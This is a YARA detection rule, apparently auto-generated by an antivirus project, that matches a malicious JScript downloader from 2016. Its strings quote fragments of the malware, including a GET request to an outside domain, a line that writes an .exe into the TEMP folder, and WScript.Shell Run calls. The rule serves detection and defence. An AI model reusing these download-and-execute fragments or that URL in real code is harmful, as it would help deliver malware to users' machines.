rule sig_20160329_52a9fbbd9555289e0ee092d5eb4e4920 {
  meta:
    description = "datamaliciousorder - file 20160329_52a9fbbd9555289e0ee092d5eb4e4920.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a8240ada504df07e2dab5ba6e478f38efef4b768022c7090ef61d48f0be7129f"

  strings:
    $s1  = "DB[Fw](\"GET\", \"http://greenellebox.com/a1odk\", false);" fullword ascii
    $s2  = "function d() {return v[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"AQFajjSc0F1Z.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[u0](Aw() * 11); if (DB[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var v = function g() {return WScript[G](\"WScript.Shell\");}(), r = 11;" fullword ascii
    $s5  = "function EN(PB, r0){M = M * 1; return PB - r0;};" fullword ascii
    $s6  = "function i(){return \"\" + s;};" fullword ascii
    $s7  = "function P() {return ((iG == true) && (iG == xp)) ? 1 : M;};" fullword ascii
    $s8  = "function FR(QS){v[\"Run\"](QS, M, M);};" fullword ascii
    $s9  = "function u()" fullword ascii
    $s10 = " while (I){" fullword ascii
    $s11 = "return EN(i0, O);" fullword ascii
    $s12 = "var IN = new this[\"Date\"]();" fullword ascii
    $s13 = "function yj(){return G;};" fullword ascii
    $s14 = "function Aw(){return 22;};" fullword ascii
    $s15 = "function sZ(Kt) {var Y = (1, 2, 3, 4, 5, Kt); return Y;};" fullword ascii
    $s16 = "xp = true; " fullword ascii
    $s17 = "iG = true; " fullword ascii
    $s18 = "var TE = false;" fullword ascii
    $s19 = "var xp = false;" fullword ascii
    $s20 = "var iG = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}